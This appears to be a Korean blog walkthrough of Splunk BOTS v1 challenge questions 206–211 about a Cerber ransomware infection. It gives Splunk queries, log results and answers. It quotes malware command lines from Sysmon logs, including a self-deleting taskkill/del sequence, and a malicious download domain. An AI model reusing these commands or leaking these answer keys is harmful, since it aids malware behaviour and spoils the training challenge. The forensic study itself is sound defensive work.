+  해당 날짜에 감염된 장치에서 SMB(Windows 파일 공유 프로토콜) 트래픽을 검색합니다. "stats" SPL 명령은 SMB 프로토콜에 대한 가장 일반적인 대상 IP를 계산하는 데 사용할 수 있습니다.
+</details>
+
+이 질문은 207, 209를 풀면 더 쉽게 알 수 있습니다.
+207번 질문에서 원격 파일 서버의 pdf가 암호화되었다고 했으니, 검색해보면
+hostname은 we9041srv.waynecorpinc.local, IP는 192.168.250.20인것을 알 수 있습니다.
+
+답 : 192.168.250.20
+
+207	How many distinct PDFs did the ransomware encrypt on the remote file server?  
+랜섬웨어는 원격 파일 서버에서 얼마나 많은 개별 PDF를 암호화했습니까?
+
+<details>
+  <summary>hint#1</summary>
+  Don't use SMB this time - it's a trap!  Windows event logs are the way to go for this one.  Focus on the event types that deal with windows shares and narrow the search by looking for distinct filenames for the extension in question.<br>
+  이번에는 SMB를 사용하지 마십시오. 함정입니다! Windows 이벤트 로그는 이를 위한 방법입니다. Windows 공유를 처리하는 이벤트 유형에 집중하고 해당 확장에 대한 고유한 파일 이름을 찾아 검색 범위를 좁힙니다.
+</details>
+
+pdf 확장자를 검색해봅니다.
+
+```
+.pdf
+```
+![pdf확장자]({{site.url}}/assets/built/images/splunk/bots/v1/2021-10-18-17-48-58.png)
+
+파일이 암호화되었다면 eventlog에 파일생성, 파일 변경 등의 로그가 있을것입니다.
+
+또, we8015에 있는 랜섬웨어가 원격서버인 we9041srv의 파일을 암호화 한것이므로 목적지가 we9041srv인 조건을 추가해 검색해봅니다.
+
+```
+sourcetype="wineventlog" .pdf dest=we9041srv.waynecorpinc.local 192.168.250.100 | stats dc(Relative_Target_Name)
+```
+
+- 결과 
+
+|dc(Relative_Target_Name)|
+|---|
+|257|
+
+답 : 257
+
+208	The VBscript found in question 204 launches 121214.tmp. What is the ParentProcessId of this initial launch?  
+문제 204에서 찾은 VBscript는 121214.tmp를 시작합니다. 이 초기 실행의 ParentProcessId는 무엇입니까?
+
+<details>
+  <summary>hint#1</summary>
+  Embrace your sysmon data.  Search for a command issued by the infected device on the date in question referencing the filename in question, and use the process_id, ParentProcessId, CommandLine,  and ParentCommandLine, to track down the parent process id of them all.<br> 
+  sysmon 데이터를 수용하십시오. 해당 파일 이름을 참조하여 해당 날짜에 감염된 장치에서 실행된 명령을 검색하고 process_id, ParentProcessId, CommandLine 및 ParentCommandLine을 사용하여 모두의 상위 프로세스 ID를 추적합니다.
+</details>
+
+parentprocessid는 sysmon에서 찾을 수 있습니다.
+
+```
+sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 121214.tmp
+| where isnotnull(parent_process_id)
+| table _time parent_process_id ParentCommandLine process_id CommandLine 
+| sort _time
+```
+
+|_time|parent_process_id|ParentCommandLine|process_id|CommandLine|
+|---|---|---|---|---|
+|2016/08/24 16:48:21|	1476|	"C:\Windows\System32\cmd.exe" /C START "" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"	|2948|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|
+|2016/08/24 16:48:21|	3968|	"C:\Windows\System32\WScript.exe" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\20429.vbs"	|1476|	"C:\Windows\System32\cmd.exe" /C START "" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"
+|2016/08/24 16:48:29|	2948|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|	3828|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|
+|2016/08/24 16:48:41|	1280|	/d /c taskkill /t /f /im "121214.tmp" &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp" &gt; NUL	|1684|	taskkill  /t /f /im "121214.tmp"|
+|2016/08/24 16:48:41|	3828|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|	1280|	/d /c taskkill /t /f /im "121214.tmp" &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp" &gt; NUL
+|2016/08/24 16:48:41|	3828|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|	3836	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe"
+|2016/08/24 16:48:42|	1280|	/d /c taskkill /t /f /im "121214.tmp" &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp" &gt; NUL	|556|	ping  -n 1 127.0.0.1|
+
+질문에서 vbs가 121214.tmp를 실행시켰다고 하니 20429.vbs가 실행파일임을 알 수 있습니다.
+
+답 : 3968
+
+209	The Cerber ransomware encrypts files located in Bob Smith's Windows profile. How many .txt files does it encrypt?  
+Cerber 랜섬웨어는 Bob Smith의 Windows 프로필에 있는 파일을 암호화합니다. 얼마나 많은 .txt 파일을 암호화합니까?
+
+<details>
+  <summary>hint#1</summary>
+  Sysmon to the rescue again.  Focus on the infected machine as well as the user profile while searching for the filename extension in question.
+  Sysmon에서 다시 찾읍시다. 문제의 파일 이름 확장자를 검색하는 동안 감염된 시스템과 사용자 프로필에 집중하십시오.
+</details>
+<details>
+  <summary>hint#2</summary>
+  In Sysmon events, EventCode=2 indicates file creation time has changed. Watch out for duplicates!<br>
+  Sysmon 이벤트에서 EventCode=2는 파일 생성 시간이 변경되었음을 나타냅니다. 중복에 주의하세요!
+</details>
+
+bob의 hostname은 we8105desk임을 전 문제에서 파악했습니다. 
+아래 조건대로 쿼리를 작성해 검색해 봅시다.
+
+1. 침해당한 host는 we8105desk이다.
+2. 침해당한 파일들의 확장자는 .txt파일
+3. File이 새로 생성 및 수정 됐을것이므로, eventCode는 2번일것이다(File Create time)
+4. TargetFilename을 보면 경로가 소유자/파일명형식으로 되어있다. 소유자가 bob smith인 데이터를 발췌.
+
+```
+sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational host=we8105desk EventCode=2 TargetFilename=*smith*.txt
+| stats dc(TargetFilename)
+```
+
+- 결과  
+
+|dc(TargetFilename)|
+|---|
+|406|
+
+답 : 406
+
+210	The malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?  
+멀웨어는 Cerber 랜섬웨어 암호화 코드가 포함된 파일을 다운로드합니다. 그 파일의 이름은 무엇입니까?
+<details>
+  <summary>hint#1</summary>
+  When looking for potentially malicious file, start your search with the Suricata data.  Narrow your search by focusing on the infected device. Remember malware does not always have to begin as an executable file.  <br>
+  잠재적인 악성 파일을 찾을 때 Suricata 데이터로 검색을 시작하십시오. 감염된 장치에 집중하여 검색 범위를 좁힙니다. 맬웨어가 항상 실행 파일로 시작해야 하는 것은 아닙니다.
+</details>
+
+203번 문제에서 파악한 의심스러운 도메인 solidaritedeproximite.org을 키워드로 suricata에서 찾아봅시다.
+
+```
+sourcetype=suricata solidaritedeproximite.org
+| dedup src dest dest_ip url
+| table src dest dest_ip url
+```
+
+- 결과  
+
+|src|dest|dest_ip|url|
+|---|---|---|---|
+|37.187.37.150|	solidaritedeproximite.org|	192.168.250.100| /mhtr.jpg|
+|192.168.250.100|	solidaritedeproximite.org|	37.187.37.150| /mhtr.jpg|
+
+의심스러운 도메인에서 접속한 파일은 이미지파일인 mhtr.jpg입니다.
+
+답 : mhtr.jpg
+
+211	Now that you know the name of the ransomware's encryptor file, what obfuscation technique does it likely use?  
+이제 랜섬웨어의 암호화 파일 이름을 알았으니 어떤 난독화 기술을 사용할까요?
+<details>
+  <summary>hint#1</summary>
+  The enrcyptor file was an image!  <br>
+  암호화 파일은 이미지였습니다!
+</details>
+
+암호화 파일은 이미지였으므로, 이미지관련 난독화기술은 steganography입니다.  
+[steganography란?](https://ko.wikipedia.org/wiki/%EC%8A%A4%ED%85%8C%EA%B0%80%EB%85%B8%EA%B7%B8%EB%9E%98%ED%94%BC)
